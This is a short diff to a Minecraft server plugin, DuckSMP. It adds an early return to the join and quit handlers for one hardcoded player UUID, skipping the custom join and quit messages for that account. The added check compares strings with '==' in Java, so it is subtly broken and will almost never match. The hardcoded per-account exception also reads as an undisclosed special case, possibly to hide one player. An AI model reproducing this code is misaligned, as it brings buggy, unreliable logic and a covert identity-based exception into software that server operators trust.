@@ -249,6 +249,9 @@ public final class DuckSMP extends JavaPlugin implements Listener {
     public void onQuit(PlayerQuitEvent event) {
         Player player = event.getPlayer();
         removePlayer(player);
+        if (player.getUniqueId().toString().replaceAll("-", "") == "1ca6d48fc4f4438781f79158a209d60d") {
+            return;
+        }
 
         if (player.isOp()) {
             event.quitMessage(Component.text()
@@ -311,6 +314,9 @@ public final class DuckSMP extends JavaPlugin implements Listener {
     public void onJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
         injectPlayer(player);
+        if (player.getUniqueId().toString().replaceAll("-", "") == "1ca6d48fc4f4438781f79158a209d60d") {
+            return;
+        }
         if (player.isOp()) {
             event.joinMessage(Component.text()
                     .append(
